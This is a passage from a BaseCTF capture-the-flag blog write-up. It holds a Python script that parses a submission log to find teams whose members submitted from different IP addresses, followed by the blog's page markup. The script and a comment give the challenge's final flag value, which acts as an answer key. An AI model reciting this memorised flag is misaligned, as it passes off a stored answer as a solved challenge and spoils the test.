+def getInfo(s):
+    if s.find(&quot;+08:00&quot;) == -1:
+        print(&quot;？？？你的时区发生啥事&quot;)
+    time = mstr(s, &quot;[&quot;, &quot; INF] &quot;)
+    team = mstr(s, &quot;] FlagChecker: 队伍 [&quot;, &quot;] 提交题目 &quot;)
+    flag = mstr(s, &quot;] 的答案 [&quot;, &quot;] &lt;&quot;)
+    submitter = mstr(s, &quot;] &lt;&quot;, &quot;&gt;&quot;)
+    challenge = mstr(s, &quot;] 提交题目 [&quot;, &quot;] 的答案 [&quot;)
+    ip = s[s.find(&quot;&gt; @ &quot;) + len(&quot;&gt; @ &quot;):]
+    return time, team, flag, submitter, challenge, ip
+
+vpn = set()#哪些队开了梯子
+with open(&quot;submissions.log&quot;, &quot;r&quot;, encoding = 'utf8') as f:
+    lines = f.readlines()
+    for line in lines:
+        time, teamName, flag, submitter, challengeName, ip = getInfo(line)
+        if teamName == &quot;Terence Barrows&quot; and (submitter == &quot;Mercedes49&quot; or submitter == &quot;Albert.Considine&quot;):#特判
+            teamName = &quot;#&quot; + teamName
+
+        if submitter not in FLAG[teamName][&quot;member&quot;]:
+            FLAG[teamName][&quot;member&quot;][submitter] = ip
+            continue
+
+        if FLAG[teamName][&quot;member&quot;][submitter] != ip:
+            vpn.add(teamName)
+
+v = []
+for i in vpn:
+    v.append(i)
+
+v = sorted(v)
+FLAG = &quot;&quot;
+for i in v:
+    FLAG += i + &quot;,&quot;
+print(&quot;BaseCTF{&quot; + MD5(FLAG[:-1]) + &quot;}&quot;)#BaseCTF{dc45a2a228f503cfd00d5218df367a8e}
+</code></pre>
+
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://xiaoxiauwu.github.io/tags/tag1/">tag1</a>
+
+  <a class="tag tag--primary tag--small" href="https://xiaoxiauwu.github.io/tags/tag2/">tag2</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://xiaoxiauwu.github.io/post/ctf/basectf_fin_osc/" data-tooltip="[BaseCTF] [Fin] osc" aria-label="PREVIOUS: [BaseCTF] [Fin] osc">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="Leave a comment">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/xiaoxiauwu.github.io\/post\/ctf\/basectf\/';
+        
+          this.page.identifier = '\/post\/ctf\/basectf\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'hugo-tranquilpeak-theme';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2024 XiaoXia. All Rights Reserved
+  </span>
+
+
+<div class="busuanzi-footer">
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  <span id="busuanzi_container_site_uv">
+    本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+</div></footer>
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://xiaoxiauwu.github.io/post/ctf/basectf_fin_osc/" data-tooltip="[BaseCTF] [Fin] osc" aria-label="PREVIOUS: [BaseCTF] [Fin] osc">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="Leave a comment">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://xiaoxiauwu.github.io/images/avatar.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">XiaoXia</h4>
+    
+      <div id="about-card-bio">憧憬着未来却虚度着当下，到头来自己也只是一片空虚吧<strong>LIVE IN THE MOMENT</strong></div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        学生
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker-alt"></i>
+        <br/>
+        华南理工大学
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://xiaoxiauwu.github.io/images/cover_.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://xiaoxiauwu.github.io/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+  
+    <script src="https://xiaoxiauwu.github.io/js/click.js"></script>
+  
+
+  
+    <script src="https://xiaoxiauwu.github.io/js/sakura.js"></script>
+  
+
+  
+    <script src="https://xiaoxiauwu.github.io/js/cp.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
